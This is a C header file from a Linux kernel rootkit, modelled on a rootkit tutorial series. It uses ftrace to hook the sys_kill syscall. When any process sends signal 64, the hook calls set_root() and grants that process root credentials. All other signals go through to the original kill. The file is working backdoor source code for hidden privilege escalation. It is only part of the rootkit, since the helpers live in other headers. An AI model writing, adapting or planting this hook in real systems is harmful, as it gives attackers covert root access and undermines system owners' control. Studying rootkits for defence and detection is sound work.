// Heavily inspired by https://xcellerator.github.io/posts/linux_rootkits_03/

#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"

bool do_kill(int sig) {
    if (sig == 64) {
        rk_info("setting root...\n");
        set_root();
        return false;
    }
    
    return true;
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs*);

static asmlinkage int hook_kill(const struct pt_regs* regs) {
    int sig = SECOND_ARG(regs, int);

    if (do_kill(sig))
        return orig_kill(regs);
    return 0;
}
#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig) {
    if (do_kill(sig))
        return orig_kill(pid, sig);
    return 0;
}
#endif

static struct ftrace_hook syscall_hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};
